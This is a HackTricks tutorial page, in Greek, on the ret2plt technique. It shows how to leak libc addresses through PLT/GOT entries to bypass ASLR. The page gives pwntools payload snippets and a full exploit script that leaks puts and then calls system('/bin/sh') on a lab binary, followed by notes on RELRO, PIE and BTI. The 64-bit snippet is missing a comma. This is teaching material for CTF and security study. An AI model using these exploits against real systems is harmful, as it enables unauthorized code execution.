# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Ο στόχος αυτής της τεχνικής είναι να **leak μια διεύθυνση από μια συνάρτηση του PLT** ώστε να μπορέσει να παρακαμφθεί το ASLR. Αυτό συμβαίνει επειδή, για παράδειγμα, αν leakάρετε τη διεύθυνση της συνάρτησης `puts` από τη `libc`, μπορείτε στη συνέχεια να **υπολογίσετε πού βρίσκεται η βάση της `libc`** και να υπολογίσετε offsets για πρόσβαση σε άλλες συναρτήσεις όπως η **`system`**.

Αυτό μπορεί να γίνει με ένα `pwntools` payload όπως ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Σημειώστε πώς **`puts`** (χρησιμοποιώντας τη διεύθυνση από το PLT) καλείται με τη διεύθυνση του `puts` που βρίσκεται στον GOT (Global Offset Table). Αυτό συμβαίνει επειδή όταν το `puts` τυπώσει την καταχώρηση GOT του `puts`, αυτή η **καταχώρηση θα περιέχει την ακριβή διεύθυνση του `puts` στη μνήμη**.

Επίσης, παρατηρήστε πώς η διεύθυνση του `main` χρησιμοποιείται στο exploit ώστε όταν το `puts` τελειώσει την εκτέλεσή του, το **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).

> [!CAUTION]
> Σημειώστε πως για να λειτουργήσει αυτό είτε το **binary cannot be compiled with PIE** είτε πρέπει να έχετε **found a leak to bypass PIE**, ώστε να γνωρίζετε τις διευθύνσεις του PLT, GOT και του main. Διαφορετικά, πρέπει πρώτα να bypass το PIE.

Μπορείτε να βρείτε ένα [**πλήρες παράδειγμα αυτού του bypass εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Αυτό ήταν το τελικό exploit από εκείνο το **παράδειγμα**:

<details>
<summary>Πλήρες παράδειγμα exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Σύγχρονες επισημάνσεις

- **`-fno-plt` builds** (συνηθισμένο στις σύγχρονες διανομές) αντικαθιστούν `call foo@plt` με `call [foo@got]`. Εάν το binary δεν έχει stub `foo@plt`, μπορείς ακόμα να leak τη λυμένη διεύθυνση με `puts(elf.got['foo'])` και μετά **να επιστρέψεις απευθείας στην εγγραφή του GOT** (`flat(padding, elf.got['foo'])`) για να πηδήξεις στο libc μόλις ολοκληρωθεί το lazy binding.
- **Full RELRO / `-Wl,-z,now`**: Το GOT είναι μόνο για ανάγνωση αλλά το ret2plt εξακολουθεί να δουλεύει για leaks γιατί διαβάζεις μόνο την εγγραφή του GOT. Αν το σύμβολο δεν είχε ποτέ κληθεί, το πρώτο σου ret2plt θα πραγματοποιήσει επίσης lazy binding και μετά θα εκτυπώσει την resolved εγγραφή.
- **ASLR + PIE**: αν το PIE είναι ενεργοποιημένο, πρώτα leak έναν code pointer (π.χ. saved return address, function pointer, ή `.plt` entry μέσω άλλου format‑string/infoleak) για να υπολογίσεις τη βάση του PIE, και μετά κατασκευάζεις την ret2plt αλυσίδα με τις rebased διευθύνσεις PLT/GOT.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: Οι καταχωρήσεις PLT είναι έγκυρα BTI landing pads (`bti c`), οπότε όταν κάνεις exploitation σε binaries με BTI προτίμησε να πηδήξεις στο PLT stub (ή σε άλλο BTI‑annotated gadget) αντί να πηδήξεις απευθείας σε ένα libc gadget χωρίς BTI, αλλιώς η CPU θα σηκώσει `BRK`/`PAC` failures.
- **Quick resolution helper**: αν η target function δεν είναι ακόμα resolved και χρειάζεσαι ένα leak σε ένα μόνον βήμα, αλυσώσε την PLT call δύο φορές: πρώτα `elf.plt['foo']` (για να γίνει resolve) και μετά ξανά `elf.plt['foo']` με τη διεύθυνση του GOT ως όρισμα για να εκτυπώσεις την τώρα‑συμπληρωμένη εγγραφή.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, το πρώτο βήμα είναι να γεμίσεις το overflow μέχρι το byte 0x00 του canary και μετά να καλέσεις puts για να το leak. Μόλις έχεις το canary, δημιουργείται ένα ROP gadget για να καλέσει puts και να leak-άρει τη διεύθυνση του puts από το GOT και στη συνέχεια ένα ROP gadget για να καλέσει `system('/bin/sh')`.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow στο main από μια child function. ROP gadget για να καλέσει puts και να leak-άρει τη διεύθυνση του puts από το GOT και μετά να καλέσει ένα one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
